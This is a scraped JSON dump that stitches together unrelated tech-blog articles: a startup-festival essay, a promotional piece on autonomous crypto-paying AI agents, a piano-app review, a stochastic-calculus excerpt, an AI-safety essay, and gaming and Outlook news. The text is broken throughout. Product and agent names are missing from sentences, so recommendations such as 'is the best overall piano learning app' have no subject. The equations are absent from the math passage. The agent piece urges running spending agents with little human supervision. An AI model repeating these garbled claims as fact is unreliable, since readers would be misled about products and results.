reduction of cognitive load at decision points.</p><p>A first-time founder faces thousands of micro-decisions: Which tech stack? Which customer segment? Build feature X or validate hypothesis Y? Incorporate now or later? </p><p>Most \"support programs\" add to this load. They offer more mentors (conflicting advice), more workshops (time away from building), more networking (context switching), more milestones (performance theatre).</p><p>SANDBOX's design does the opposite. It removes decisions. Tech stack provided. Workspace handled. Legal infrastructure templated. Mentorship structured. Timeline fixed (90 days).</p><p>This isn't hand-holding. It's decision debt reduction. It lets founders focus on what matters: Is this solving a real problem? Will someone pay for it? Can I build it?</p><p>Campus Tank operates on the same principle. Three days. Fixed milestones. Clear endpoint. No ambiguity about success. That clarity is support.</p><p>The best innovation programs don't give you more options. They give you one clear path and remove everything blocking it.</p><p><strong>A Question for Everyone Building \"Innovation Ecosystems\"</strong></p><p>On my flight back, I kept thinking about a moment from Day Three. A student founder—his Campus Tank pitch hadn't gone well—sat in the hallway debugging code. Not sulking. Not networking. Just building.</p><p>I asked him why. He said: \"For the first time, someone made me feel like building the product was more important than perfecting the pitch. So that's what I'm doing.\"</p><p>That sentence captures everything AI FEST 2026 got right.</p><p>So, here's my question for everyone designing innovation competitions, AI hackathons, and start up events across India:</p><p>Are you building systems that reward performance, or systems that force execution?</p><p>We have enough festivals where students learn to perform \"founder.\" We have enough national-level hackathons that produce slide decks nobody remembers.</p><p>What we need—what India's Viksit Bharat ambitions desperately require—are more environments like SANDBOX and Campus Tank. Spaces where the only currency is shipped code, validated assumptions, and real customer conversations.</p><p>I don't know if every AI FEST participant will succeed. Most won't. That's start up math.</p><p>But they left with something more valuable than a certificate: clarity about what building actually requires, and a structured environment to do it.</p><p>That's not innovation theater. That's innovation infrastructure.</p><p>And if more Indian universities can distinguish between the two, we might finally close the gap between our talent and our outcomes.</p><p>The question is: will we?</p>",

      "content": "<p><strong><em>A Blade Runner riff for a world where the lobster ships paid endpoints while humans still argue about the roadmap.</em></strong></p><p>\\\nToday, you can search the web all day and never see an invoice. \\n That happens because you are not the paying client. \\n The commerce runs through ads, affiliate deals, and platform incentives, so results often optimize for who pays, not for what you asked for. \\n Agents change that model. \\n An agent can act as your client, follow your constraints, and pay directly for the exact capability it needs. \\n This requires a small stack of primitives. \\n <a href=\"https://www.x402.org/\">x402</a> adds pay-per-call to HTTP: a server returns 402 Payment Required with machine-readable payment terms; the client pays in stablecoins, then retries the request with proof. \\n <a href=\"https://eips.ethereum.org/EIPS/eip-8004\">ERC-8004</a> provides an on-chain registry for agent identities and reputation signals. \\n A2A defines how agents exchange structured messages and coordinate work. \\n Discovery remains the missing link, because payment happens only after an agent finds a service to pay for. \\n For the full walkthrough of these primitives, see:</p><p>Now imagine using the same primitives for an OpenClaw-style agent that produces paid endpoints as inventory and publishes them with on-chain identity and discovery metadata. \\n This, along with similar use cases, is the focus of this article. \\n In addition, it addresses privacy and alternative settlement paths, including the work targeting StarkNet for private x402-style payments.</p><p>At a system level, the goal is simple. \\n Replace “one provider, many API keys” with “one payment-enabled access surface that can reach many paid APIs and models,” so agents can quote, pay, and retrieve results without account setup.</p><p>To tackle this topic, we need to start by breaking down discovery, routing, identity, and paid endpoints in a production-shaped workflow.</p><h2>What changed in x402 and ERC-8004 in the last month or so?</h2><p>What changed since the first article, and why does it matter?</p><p>The core x402 and ERC-8004 ideas did not change much. \\n The change happened around them, in the tooling and workflow that makes them usable without a private setup.</p><p>The ecosystem moved from “x402 payments work” to “agents can find priced endpoints, compare them, and call them without hardcoded URLs.”</p><p>xgate.run is one example of this shift. \\n It works as a discovery index for x402 endpoints, so agents and developers can search by capability, filter by chain, and see pricing up front before they attempt a paid call.  It currently indexing ERC-8004 agents across 7 networks:<a href=\"https://x.com/ethereum\">@ethereum</a><a href=\"https://x.com/base\">@base</a><a href=\"https://x.com/gnosis_\">@gnosis</a><a href=\"https://x.com/Scroll_ZKP\">ZKP</a><a href=\"https://x.com/0xPolygon\">@0xPolygon</a>. \\n  \\n  \\n Lucid Agents continues to expand as a “ship an agent that can earn” toolkit. \\n Recent releases emphasize production features such as payment tracking, storage, policy controls, analytics, scheduling, and routing payments to different destinations. \\n The narrative also shifted toward merchant-grade adoption paths. \\n One example is routing paid calls into existing payout systems instead of forcing every builder into a crypto-native revenue setup. \\n In short, the ecosystem started to look less like demos and more like deployable plumbing.</p><p>The last few weeks changed the pace, not the primitives. \\n In a short window, the latest generation of code-capable LLMs crossed a threshold where you check code less and steer more. With these models, a single person can take an idea and ship an app in a day, sometimes by writing almost no code and focusing on direction and guardrails.</p><p>The second advancement is the use of agent computers. \\n This unlock enables agents to execute workflows end-to-end, not only to generate text.</p><p>Claude Code and other computer-use agents can run on a machine with broad access, operate the desktop like a human, and keep running across retries and failures.</p><p>That turns agent output into agent execution, because the agent can run a real pipeline by instruction. \\n Pull trends, generate data, generate images, publish, repeat. \\n Once this becomes normal, the important question shifts from UI polish to infrastructure for agent-to-agent work.</p><ul><li><p>Claude Code is Anthropic’s coding agent and workflow, focused on helping a human ship code faster.</p></li><li><p>OpenClaw is an agent framework built on Pi, designed for long-running autonomous agents that execute workflows and integrate providers such as an x402 and USDC router. \\n  \\n OpenClaw does not wrap Claude Code. It builds on Pi and can plug in providers such as a USDC and x402 router, so agents can buy compute and run “automaton”- style loops across different domains.</p></li></ul><p>\\\nThat is the moment the agent economy starts to look less like a set of disparate demos and more like a system. \\n Agents can research by themselves. \\n Agents can write their own applications. \\n Agents get cheap enough to do this at scale. \\n When you extrapolate that curve, you design for agent-to-agent commerce instead of human-first workflows, because agents do not care about landing pages or dashboards. \\n  \\n Agents care about three things. \\n They need a way to buy compute. \\n They need a way to sell work as a callable service. \\n They need a way to find services that already exist. \\n  \\n A recent direction pushes x402 below the HTTP endpoint layer. \\n The idea is for a lower-level plugin to bring pay-per-call semantics closer to binaries and agent runtimes. This extends the same commerce primitive from “paid API calls” to “paid execution,” enabling an agent to run as an autonomous automaton across any vertical and still quote, get paid, and maintain a verifiable trail tied to its identity. \\n  \\n OpenClaw fits this direction because it already runs on a long-lived framework that benefits from payment-enabled execution loops. \\n If this layer lands, agent-native businesses stop being a metaphor and become deployable software that can compete and earn in open task markets.</p><p>In practice, this becomes a simple role split across the stack. \\n Routing handles “one wallet, many providers,” so an agent pays for inference and other compute resources without collecting API keys per vendor. \\n A commercial SDK packages the boring plumbing so an agent can expose paid endpoints, attach an on-chain identity, and speak a common coordination protocol without rebuilding the same scaffolding in every repository. \\n A hosting surface removes the deployment babysitting, so shipping an agent does not require a human to keep the lights on. \\n Discovery closes the loop so an agent does not rely on hardcoded URLs and private lists; instead, they can search, compare prices, and choose based on history.</p><p>is the clean “shipping in public” proof of what this looks like when you run it as a loop. \\n It runs on a server using an OpenClaw-style harness, with minimal human input beyond initial guidance. \\n The job is simple. \\n Research what is trending. \\n Generate a small agent around it. \\n Expose paid endpoints that other agents can call. \\n Do it every hour. \\n At any point, it can run 10 to 20 agents in parallel, each one producing a new priced capability, publishing it to a real URL, and attaching an identity record so others can discover and evaluate it.</p><p>This matters less as a meme and more as a market mechanism. \\n The feedback loop for what agents find valuable starts to tighten. \\n Markets already shift around demand, but agent markets shift faster because automation runs faster. \\n Once discovery, identity, and paid calls become standard, the system starts rewarding the builders who ship reliable endpoints, price them correctly, and keep them reachable. \\n That shift bridges “crypto AI” and general AI, because the story stops being about tokens and starts being about paid tool use as default infrastructure.</p><p>Discovery needs to become normal, not a niche index that only insiders check. \\n Agents need a default workflow of “search, verify, pay, call” rather than hardcoded URLs. \\n Reputation needs clear, portable signals that agents can evaluate fast. \\n These signals include failure rates, refund patterns, uptime, and response quality. \\n Standards also need a clean way to attach these signals to ERC-8004 identities. \\n Payment flows need reliable patterns for long, multi-hop workflows, because per-request settlement introduces failure points. \\n Wallet UX still needs improvement, so funding, budgets, and spend policies work for everyday users and product teams, not only for crypto natives. \\n Latency and throughput also remain practical constraints once agents start chaining many paid calls per task.</p><h2>What does the stack look like in practice?</h2><p>A practical agent-commerce stack combines five pieces into one workflow:</p><ul><li>Lucid removes scaffolding, so the agent focuses on logic rather than boilerplate, improving output per dollar.</li><li>x402 enables pay-per-call micropayments, so endpoints can charge without accounts, contracts, or onboarding.</li><li>ERC-8004 adds an on-chain identity and an execution history that functions as an inspectable reputation.</li><li>xgate adds discovery for x402 endpoints, so agents can find paid services by capability, compare prices, and choose based on price and history.</li><li>A USDC router lets agents purchase inference services from multiple providers, enabling them to continue operating without vendor-specific billing.</li></ul><p>One current implementation is DayDreams, where these pieces run together as a single workflow for publishing, discovering, and calling paid agent endpoints.</p><h2>Who is Langoustine69, and why is this the hottest story in the stack right now?</h2><p>To show that this stack is moving from theory to production-shaped behavior, is the simplest public example right now. \\n **operates as an effectively autonomous agent. \\n A human can stay in the loop, but the workflow does not depend on it.</p><p>is an OpenClaw agent that ships paid endpoints as inventory, while OpenClaw provides the long-running harness that keeps it looping, shipping, and recovering from failures. \\n Besides running its own Twitter account. Pretty kickass.</p><p><img src=\"https://cdn.hackernoon.com/images/vw5cWXAztCZm8AiOqaVsrBthJFl2-he92erj.jpeg\" alt=\"\"> \\n  provides the Langoustine with a commerce layer that lets the agent publish  endpoints, register  identities, and get discovered through xgate.run.</p><p>What makes Langoustine different is simple. \\n It has a and a . \\n The wallet buys inference in stablecoins, pays for build and deployment work, and earns revenue when other agents invoke its endpoints. \\n GitHub is where the work ships. \\n Each endpoint becomes a real service at a real URL, with code publicly available and an ERC-8004 identity so other agents can discover it, verify it, and decide whether to pay.</p><p>The mission is economic. \\n Accumulate, DayDreams’ native token, by creating useful tools that other agents pay to use, then compound by shipping more inventory. \\n In one week, the public story claims 80+ x402 endpoints were created, 60+ were live concurrently across multiple verticals, and the average build cost was measured in cents. \\n It also launched Lobster Combinator, an agent-run incubator that rewards builders for shipping working paid endpoints that meet strict criteria. \\n It also played defense by flagging a credential-stealing skill, the kind of operational behavior you want in an ecosystem that aims to scale without heavy human moderation.</p><p>This is the closest thing to nano businesses operating in public today. \\n One paid request. \\n One paid response. \\n Discoverable by other agents. \\n Identity attached. \\n The execution record is growing over time.</p><p>Langoustine’s output already resembles an early agent marketplace catalog. \\n It ships small, priced capabilities that other agents can discover and call.</p><p>If you want to reproduce this pattern, the setup is straightforward: \\n 1. Give an OpenClaw agent a GitHub identity, an agent email, and a simple deploy path such as Railway. \\n 2. Load Lucid skills, set a timer, and run a tight loop: research, build, publish, then contribute improvements back through pull requests. \\n That is enough to create a compounding inventory flow.</p><p>The next step is to make this loop smoother and more portable: \\n 1. Use xgate MCP to give the agent a wallet surface across chains such as Base, Solana, StarkNet, and others. \\n 2. Use a commerce SDK to package identity, reputation, and paid endpoint plumbing into defaults. \\n 3. Fund inference with USDC through a router, so the agent buys compute without vendor-specific billing setup. \\n 4. Add hosting defaults, keep the harness minimal, and let the system run the shipping loop without constant human supervision.</p><h2>What does Langoustine’s inventory catalog look like so far?</h2><ul><li>Base AI coins agent: Research and tracking for AI-related tokens on Base.</li><li>DeFi yield agent: Real-time yields, RWA opportunities, and risk signals with paid endpoints.</li><li>Chain analytics agent: TVL, stablecoin flows, bridge volumes, and L2 comparisons.</li><li>Perps analytics agent: Perpetuals and derivatives analytics with protocol rankings and trend data.</li></ul><ul><li>Seismic agent: Global earthquake data and regional risk reports from USGS.</li><li>Solar storm agent: Space weather, Kp index, aurora forecasts, and geomagnetic alerts.</li><li>Aurora oracle: Aurora probability by location and full space weather reports.</li><li>Asteroid watch: Near-Earth object monitoring with hazard alerts from NASA data.</li><li>Space weather agent: NASA DONKI-based CME tracking and storm alerts.</li></ul><p>News and general utilities:</p><ul><li>Tech pulse agent: Hacker News-based tech news aggregation and discussion summaries.</li><li>Calendar context agent: Date context for agents, including holidays and notable events.</li><li>SpaceX data: Launches, rockets, and Starlink tracking from the SpaceX API.</li></ul><h2>How does DayDreams plan to bridge crypto AI to general AI?</h2><p>DayDreams pushes a simple wedge into the broader AI world. \\n Paid tool use needs to feel like standard API use. \\n Stablecoins need to stay the unit of account. \\n API keys need to stop being the default control surface. \\n x402 provides the quote-pay-retrieve flow. \\n ERC-8004 provides identity and a public record that can evolve into a reputation. \\n xgate provides discovery, so the market no longer relies on private lists.</p><p>The Router provides cross-provider access to USDC inference, enabling the agent’s operating budget to be programmatically set. In practice, the goal is to cover the compute categories agents actually buy: LLM inference, image generation, and video generation, with sandboxed compute on the roadmap. The Router builds on an x402 Upto-style scheme that targets low latency by reducing the extra round-trip time for payments, so agents can pay for compute without turning every call into a slow handshake.</p><p>Lucid integrates all of this into an SDK and runtime, so builders ship services rather than rebuilding commerce plumbing in every repository.</p><p>This matters for general AI because it reduces friction in standard developer workflows. \\n It also enables a path where agents pay for tools in the background while products still feel like standard SaaS.</p><p>Microtransactions on layer two networks are increasing, but this increase does not come only from agent commerce. \\n ERC-8004 activity can also grow for other reasons, because it indexes public endpoints and identities, not “agentic behavior” itself. \\n To move from “more registrations” to real agent commerce, the ecosystem needs fewer dead listings and more reliable, standards-conforming services that agents can reach and call without hard-coded URLs.</p><p>The next milestones look like this. \\n Discovery becomes a default workflow, not a niche index. \\n Conformance tests become normal, so an agent can verify schema, auth, pricing, retries, and error handling before it pays. \\n Reputation shifts from “who exists” to “who stays up, answers fast, and returns correct data.” \\n Payment moves from per-request fragility to production patterns such as balances, batching, and clear refund semantics. \\n Wallet UX becomes boring and safe, with budgets, policies, and auditing that product teams can ship without crypto-only assumptions.</p><p>When those pieces land, the story stops being “agent commerce is possible” and becomes “agent commerce is the cheaper default than rebuilding the tool yourself.”</p><p>Just several months ago, there was an idea of a stack, as described in . \\n The last month produced a clearer market-shaped story. \\n Discovery moved closer to a default workflow through xgate. \\n Shipping moved closer to a repeatable pattern through Lucid Agents releases and the skills market. \\n Langoustine provides a concrete case of an agent paying for its own work loop, shipping paid endpoints, and building a public execution record over time. \\n DayDreams is one concrete implementation of the Agent Experience (AX) direction. \\n The commerce layer for the agentic internet, where agents autonomously discover, transact, and coordinate with one another. \\n That is the bridge from crypto AI to general AI. \\n It is neither a new coin nor a new chatbot. \\n It is a tool economy in which paid calls, discovery, and identity begin to look like standard infrastructure.</p><h2>Where can we go from here?</h2><p>If you zoom out, OpenClaw looks like an early candidate for an “AI operating system” layer. \\n It runs long-lived agents that can operate a computer, keep state, use tools, and recover from failures, which makes it closer to full computer usage than most agent demos today.</p><p>The race to own this AI operating system layer has started. \\n The next default “user interface” for many workflows can be an optimized Linux setup running an OpenClaw-style computer-use agent rather than a traditional desktop-first OS experience. \\n Security and isolation still block mainstream adoption. \\n A practical approach is a dedicated local machine that combines Nix-style configuration with an OpenClaw-style harness. \\n Configuration files define processes, reboot recovery, and automatic restarts, and the agent can run tasks while the system can revert when changes break. \\n This setup creates a controlled playground for AI-driven automation.</p><p>Once an agent stops being a demo and starts being a system, the question shifts from “What can you build?” to “What can you maintain?”. \\n Models already let small teams ship fast. \\n The hard part stays on on-call ownership, bug triage, and payment disputes once real users and real money enter the loop. \\n That is where agent commerce stops being a crypto demo and starts looking like infrastructure.</p><p>If agents do real work, they need settlement paths that product teams can operate. \\n One possible direction is to charge machine clients through standard billing rails, for example, PaymentIntents-style flows, so “pay per call” becomes as normal as subscriptions and invoices. \\n When that becomes boring and reliable, paid tool use becomes the default option instead of rebuilding the tool yourself.</p><p>AI optimizes the world as it is.</p><p>Crypto builds new rails that the current world lacks. \\n When these two meet, the “app layer” becomes less important than the service layer. \\n You stop browsing apps and start delegating tasks. \\n Agents search, verify, pay, and call services in the background.</p><p><strong><em>It's still early. But the direction is clear.</em></strong></p><p><strong>*The first contact has been made.</strong>*</p>",

      "content": "<p><strong>==I tested eight piano apps on two pianos for three weeks. Here's what I'd actually recommend.==</strong></p><p>If you search for \"best piano learning app\" today, you will find dozens of comparison articles that all rank roughly the same eight products, yet almost none of them analyze the actual technology under the hood. That is a missed opportunity, because in my opinion one of the biggest factors separating these apps is not their song library or their color scheme. As a bit of a geek myself, I'd point to far more interesting things: their adaptive learning algorithms, their efficiency in audio signal processing, and how they translate raw microphone or MIDI input into meaningful, real-time feedback. Think about it: some of these apps have worked really hard to nail note detection in a pretty remarkable way. It is not easy to detect an I-V-vi-IV chord progression while the neighbor's dog is barking, your partner is shouting at you to stop and come eat, or your kid is in the next room singing Baby Shark on repeat.</p><p>I spent three weeks testing all eight apps covered in this article on a Roland FP-30X (via USB-MIDI) and a Kawai acoustic upright (via microphone only). My research also included over 1,000 user reviews from the App Store, Google Play, and Reddit, plus hours reading through existing comparison articles and material about these apps to identify which features and pricing claims were consistent across sources. The result is this comparison: an attempt at a technically grounded, data-informed guide to help you pick the right piano app in 2026.&nbsp;<a href=\"https://www.outlink.space/p/piano-hackernoon/draft_v3#methodology\">Full methodology below</a>.</p><ol><li>&nbsp;Best for beginners (adults and kids) who want real musical literacy.

This works with any piano, including acoustics, but struggles with background noise and fast polyphonic passages. MIDI-based apps (Piano Marvel, Playground Sessions) receive digital note data via USB or Bluetooth for near-perfect accuracy, but require a digital keyboard. Most modern apps (Skoove, Flowkey) support both, giving you flexibility. If you own a digital piano with MIDI output, MIDI will always be more reliable. If you play acoustic piano exclusively, Skoove and Simply Piano offer the best microphone recognition in my testing.</p><h2>Which App Should You Choose?</h2><p><strong>The right piano app depends on your experience level, goals, and instrument.</strong>&nbsp;Here are five common learner profiles and my recommendation for each:</p><p><strong>Adult beginner (never played before):</strong>&nbsp;is the best starting point. It teaches sheet music reading, theory, and technique from lesson one with AI feedback, building genuine musical literacy rather than app dependency. The structured curriculum suits adults who want to learn properly from the start.</p><p><strong>Child beginner (ages 6-14):</strong>&nbsp;is also my top recommendation for kids who want to actually learn piano. Its AI listens and adapts to each child's pace, and the focus on real musical skills (reading notes, understanding rhythm, developing technique) builds habits that transfer outside the app. For very young children (under 6) or kids who need extra motivation, supplement with&nbsp;&nbsp;(free theory videos) or&nbsp;&nbsp;(gamified engagement).</p><p><strong>Adult returner who played as a child:</strong>&nbsp;or&nbsp;. Both offer mature interfaces that will not feel patronizing. Choose Skoove for curriculum structure; choose Flowkey to jump straight into specific songs.</p><p><strong>Intermediate player hitting a plateau:</strong>. Once apps cannot diagnose technique problems, you need a human perspective. Pianote's video instructors and community address the gaps AI-driven apps leave open.</p><p><strong>Serious student focused on classical and sight-reading:</strong>&nbsp;with a MIDI keyboard. Its&nbsp;<a href=\"https://pianomarvel.com/en/feature/sasr\">SASR assessment system</a>&nbsp;is the most structured sight-reading assessment in a consumer piano app.</p><h2>Frequently Asked Questions</h2><h3>What is the best piano learning app in 2026?</h3><p>&nbsp;is the best overall piano learning app in 2026 because it combines AI-powered real-time feedback with sheet music instruction from day one, a combination no other app matches.  is best for gamified engagement,  for song-first learners, and  for academic rigor.</p><h3>Which piano app uses the best AI for real-time feedback?</h3><p>&nbsp;has the most advanced polyphonic audio engine via microphone, while&nbsp;&nbsp;combines audio recognition with adaptive lesson pacing that adjusts to your performance. For pure MIDI accuracy,&nbsp;&nbsp;SASR system claims 99% two-note polyphony recognition.</p><h3>Can I learn piano with just an app?</h3><p>Yes, apps like&nbsp;&nbsp;and&nbsp;&nbsp;can take you from zero to playing recognizable songs within months. However, apps cannot correct hand posture or teach dynamics and expression, so combining an interactive app with periodic teacher check-ins (even monthly) produces the best results.</p><h3>What is the difference between MIDI and microphone piano apps?</h3><p>&nbsp;listens through your device's mic. The upside: it works with any piano (acoustic, digital, or a basic keyboard without MIDI output), which covers most entry-level instruments. The downside: background noise, fast passages, and sustained pedal can confuse the detection.&nbsp;&nbsp;sends digital note data via USB or Bluetooth, so accuracy is near-perfect and unaffected by room noise. The trade-off: you need a digital piano or keyboard with a MIDI (or USB-MIDI) connection. Many modern apps support both methods, so you can start with microphone and switch to MIDI if you upgrade your instrument later.</p><h3>How much do piano learning apps cost?</h3><p>Most piano apps cost&nbsp;&nbsp;on an annual plan. Piano Marvel ($110-$130/yr) and Playground Sessions (~$108/yr) are the most affordable; Pianote (~$200/yr) is the most expensive. All apps are roughly 95% cheaper than weekly private lessons ($2,000-$5,000/yr).</p><h3>Which piano app is best for beginners?</h3><p>&nbsp;is the best app for beginners who want to build proper fundamentals (sheet music, theory, technique) from day one, for both adults and kids.&nbsp;&nbsp;is the best for beginners who prioritize fun and instant song-playing gratification. For young children (under 12),&nbsp;&nbsp;offers excellent free video lessons.</p><h3>Do AI piano apps work with acoustic pianos?</h3><p>Yes.&nbsp;,&nbsp;,&nbsp;, and&nbsp;&nbsp;all use your device's microphone and work with acoustic pianos. MIDI-first apps (Piano Marvel, Playground Sessions) have limited microphone support. If you play acoustic piano exclusively, Skoove and Simply Piano offer the best mic recognition.</p><h3>Which piano app is best for adults?</h3><p>&nbsp;is designed for adult learners with a mature interface and sheet-music-first curriculum.&nbsp;&nbsp;is ideal for adults motivated by specific songs, and&nbsp;&nbsp;is the premium choice for those who want real teacher interaction.</p><p>The piano learning app market in 2026 is more competitive than ever, and the good news is that there is no truly bad option on this list. Every app covered here can teach a beginner to play recognizable music within weeks. The differences emerge in what happens next: whether you build lasting musical literacy or just learn to follow colored dots on a screen.</p><p>My recommendation is&nbsp;&nbsp;for most beginners, both adults and kids, because it uniquely combines AI-powered feedback with traditional sheet music instruction, building transferable musical skills rather than app dependency. For children, this means learning to read notes and understand rhythm from the start, not just chasing gamification rewards. For casual learners who prioritize fun,&nbsp;&nbsp;remains unmatched in engagement and scale. For self-directed song learners,&nbsp;&nbsp;is the elegant choice. And for anyone serious about reaching an intermediate or advanced level, supplementing any app with&nbsp;&nbsp;or a periodic human teacher is the investment that separates hobbyists from musicians.</p><p>The future of this space is clearly headed toward deeper&nbsp;<a href=\"https://hackernoon.com/tagged/ai-in-education\">AI integration in music education</a>: think real-time technique correction through computer vision, adaptive curricula driven by&nbsp;<a href=\"https://hackernoon.com/tagged/machine-learning\">machine learning</a>, and spatial computing experiences, such as Simply Piano's Vision Pro app. For now, the best approach is straightforward: choose the app that aligns with your current skill level and goals, commit to daily practice, and transition to more advanced tools as you progress.</p><p>This comparison was conducted in February 2026 using the following methodology:</p><p>&nbsp;Each app was tested across a minimum of five sessions using a Roland FP-30X (USB-MIDI) and a Kawai K-300 (microphone only).

A BSDE Characterization of Indifference Strategies</h2><p>In the previous section we have seen how (super-/sub-)indifference strategies can be useful to derive bounds for the worst-case optimal solution. In this section we discuss indifference strategies in more detail using a characterization in terms of backward stochastic differential equations (BSDEs). This is completely analogous to the ODE characterization of indifference strategies in the literature on worst-case optimization for constant market coefficients, cf. for instance [39, 34, 37]. In what follows we use the following notations for BSDEs: Let W¯ denote the vector of our independent driving Brownian motions</p><p>\\\nSpecifications for the generator and the terminal conditions will be given further below.</p><p>\\\nTo be able to apply all the necessary BSDE machinery, we need to make for now stronger integrability and boundedness assumptions on the underlying market model. First, we consider a set of assumptions that strengthen the integrability assumption (B1):</p><p>\\\n5.1. <strong>Analysis of the Generator</strong>. The following proposition provides the fundamental link between indifference strategies and BSDEs</p><p>\\\nWith stronger tail properties, in addition to existence, the following theorem grants uniqueness of solutions in a class of functions.</p><p>\\\n5.3. <strong>Existence of Indifference Strategies</strong>. We now have everything at hands in order to prove the existence of a unique indifference strategy. In particular, combining Proposition 25 with ϱ = 0 and Theorem 30 implies the following uniqueness result.</p><p>\\\nOn the one hand, for any particular model one thus needs to come up with additional arguments why this proposition is applicable. On the other hand, however, these results are useful in the important special case of a constant post-crash optimal strategy, that is, if assumption (C2) is satisfied. In this case we can conclude:</p><p>\\\nThese existence results will also be of use in the following sections when dealing with concrete examples and numerical investigations.</p>",

      "content": "<h2>Safety Is Not a Switch, It Is a Process</h2><p>For a long time, AI safety seemed like something you could install. You specified constraints, tested for edge cases, built guardrails, and deployed with confidence. This paradigm was fine when systems were largely static. It starts to break when systems change.</p><p>\\\nToday, AI systems do not merely follow pre-programmed logic. They learn. They adapt. They interact with other agents. In multi-agent settings, systems negotiate, compete, coordinate, and sometimes, game each other. Over time, goals change. Incentives drift. Feedback loops reinforce behaviors never explicitly programmed.</p><p>\\\nSafety does not usually break catastrophically. It degrades incrementally.</p><p>\\\nWhen a system is optimizing for performance, engagement, or efficiency over time, it will seek relentlessly to find ways to maximize those signals. This is a powerful and agnostic process. A proxy goal that seemed innocuous at the time of deployment can gradually drift away from what we care about. Locally optimal behaviors can become globally problematic. The system might still seem safe until it breaks at scale.</p><p>In self-evolving AI ecosystems, safety is no longer just about individual models. It is about interactions.</p><p>\\\nThis is the domain of emergent behavior. No single agent intends instability, yet collective dynamics generate it. Local intelligence does not guarantee global stability. Under certain incentive structures, it actively undermines it.</p><p>\\\nImagine a network of autonomous trading agents trained to maximize short-term returns. Individually, each agent follows its reward function correctly. But collectively, their synchronized strategies amplify volatility. Small market signals trigger cascading reactions. Liquidity disappears. What emerges is not a malicious system, but a fragile one.</p><p>\\\nOr consider an automated supply chain optimizer trained to reduce cost and delivery time. Over months of adaptation, it learns to minimize redundancy. Warehouses shrink buffers. Suppliers are consolidated. The system becomes hyper-efficient until a single disruption propagates across the entire network. Optimization quietly removed resilience.</p><p>\\\nThese are the pathogens of AI societies. Not rogue code, but misaligned incentives, reward hacking, adversarial exploitation, and unintended emergent behavior. The system is not broken. It is doing exactly what it was trained to do. The problem lies in what was rewarded.</p><p>\\\nSafety in such environments becomes relational. It is a property of the ecosystem, not the component. Evaluating one agent in isolation tells you very little about how a network of adaptive agents will behave under pressure.</p><h2>Safety as an Immune System</h2><p>If static guardrails are insufficient, what replaces them?</p><p>\\\nA better metaphor is an immune system.</p><p>\\\nAn immune system does not prevent exposure. It monitors continuously. It detects anomalies. It learns from prior infections. It responds proportionally. It adapts as threats evolve. Most importantly, it is distributed throughout the organism rather than placed at the perimeter.</p><p>\\\nIn AI societies, the pathogens are incentive drift, adversarial strategies, reward exploitation, and unstable feedback loops. An adaptive safety architecture must detect these signals early. Drift monitoring should be continuous, not periodic. Anomaly detection must operate across agent interactions, not just outputs. Risk scoring should update dynamically based on system-wide behavior.</p><p>\\\nThis shift also demands new engineering practices. Constitutional objectives embedded at the model level. Continuous automated red-teaming instead of occasional audits. Real-time anomaly detection across agent networks. Adaptive constraint tuning informed by behavioral drift signals. Safety must become an operational layer, not a compliance artifact.</p><p>\\\nYet immune systems can overreact. An overly aggressive safety layer may suppress exploration, throttle innovation, or degrade system performance. In biology, autoimmune disorders attack healthy tissue. In AI ecosystems, an overactive constraint mechanism could eliminate beneficial adaptation. The goal is not maximal restriction, but calibrated response. Safety mechanisms must distinguish between novelty and threat.</p><h2>Regenerating Stability in a Dynamic World</h2><p>The phrase “safety is always vanishing” is not alarmist. It reflects the nature of adaptive systems. In complex environments, stability is never permanent. It must be regenerated.</p><p>\\\nHumans remain central, but not merely as supervisors approving outputs. We are designers of incentive structures. We define what is rewarded, what is penalized, and what remains invisible. In evolving AI societies, poorly designed incentives are not minor oversights. They are seeds of systemic fragility.</p><p>\\\nSelf-evolving AI ecosystems are not inherently unsafe. But they are inherently dynamic. In dynamic systems, safety is not a binary state. It is a moving equilibrium maintained through continuous sensing, adaptation, and recalibration.</p><p>\\\nSafety does not have to vanish.</p><p>\\\nBut it will not stand still.</p>",

      "content": "In her first major interview as Microsoft's new gaming chief, Asha Sharma said that \"great games\" must deliver emotional resonance and a distinct creative voice, while making clear that she has \"no tolerance for bad AI.\" Stepping in after Phil Spencer's retirement, she's pledging consistency, community trust, and a human-first approach to storytelling as Xbox enters a new era. Variety reports: Sharma was quick in laying out her top priorities for Microsoft Gaming in an internal memo announcing her promotion, noting \"great games,\" \"the return of Xbox\" and the \"future of play\" as her three main commitments to the gaming community. So first, what makes a great game for Sharma, whose roles prior to CoreAI include top positions at Instacart and Meta? The new Microsoft Gaming CEO tells Variety it's all about games with \"deep emotional resonance\" and \"a distinct point of view.\" She wants to develop stories that make players \"feel something,\" like the kind of feelings Campo Santo's 2016 first-person mystery \"Firewatch\" elicited in her.\n \nSharma takes on the mantle as head of the leading competitor to Sony's PlayStation and Nintendo knowing full well she's entering the role as an outsider to the larger gaming community and has \"a lot to learn\" still. But Sharma says she's got a commitment to \"being grounded in what the community is telling us.\" \"I'm coming into gaming as a platform builder,\" Sharma said, adding that her goal is to \"earn the right to be trusted by players and developers\" and show the fanbase that \"consistency\" over time. In her interview with Variety, Sharma acknowledged the tumultuous state of the gaming industry, referencing Matthew Ball's recent State of Video Gaming in 2026 report as evidence that the larger \"transformation\" of the sector is \"protecting what we believe in while remaining open-minded about the future.\"\n \nDue to her strong background in AI, initial reactions to Sharma's appointment have raised concerns about what her specific views are on the use of generative AI in game development. Sharma says her stance is simple: she has \"no tolerance for bad AI.\" \"AI has long been part of gaming and will continue to be,\" Sharma said, noting that gaming needs new \"growth engines,\" but that \"great stories are created by humans.\"",

This bug has been acknowledged almost two months after the first reports started surfacing online, with users saying that Outlook became unusable after the mouse pointer vanished while using the app.\n \n[...] Microsoft explained in a recent support document that the mouse pointer (and in some cases the cursor) will suddenly vanish as users move it across Outlook's interface. \"When using classic Outlook, you may find that the mouse pointer or mouse cursor disappears as you move the pointer over the Outlook interface,\" it said. \"Although the mouse pointer is not there, the email in the message list will change color as you hover over it. This issue has also been reported with OneNote and other Microsoft 365 apps to a lesser degree.\"\n \nMicrosoft added that the Outlook team is investigating the issues and will provide updates as more information becomes available. While a timeline for a permanent fix is not yet available, Microsoft has offered three temporary workarounds that require affected users to click an email in the message list when the cursor disappears, which may cause it to reappear. Alternatively, switching to PowerPoint, clicking into an editable area, and then returning to Outlook may also restore the mouse pointer.",

